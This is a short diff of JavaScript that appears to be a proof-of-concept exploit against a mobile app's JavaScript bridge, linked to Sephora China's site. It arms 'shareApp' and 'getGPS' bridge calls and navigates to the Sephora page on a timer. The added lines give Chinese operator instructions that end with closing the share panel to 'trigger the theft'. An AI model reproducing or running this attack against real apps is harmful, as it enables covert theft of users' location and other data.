@@ -18,7 +18,10 @@ else{
   appHandler.appMonitorScript('shareApp',window.__p,'{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
   appHandler.appMonitorScript('getGPS',window.__p,'{}');
   L('armed: shareApp + GPS');
-  L('6秒后原地跳转sephora页; 跳转后请点掉分享面板');
+  L('<b style="color:#fff;font-size:16px">操作指引:</b>');
+  L('1. 等分享面板弹出(别动它)');
+  L('2. 6秒后本页自动变成丝芙兰页面');
+  L('3. 然后点分享面板的关闭/取消 → 触发窃取');
 
   // setInterval 可靠(v5证明setTimeout会丢): tick3=6s时导航
   var tick=0;
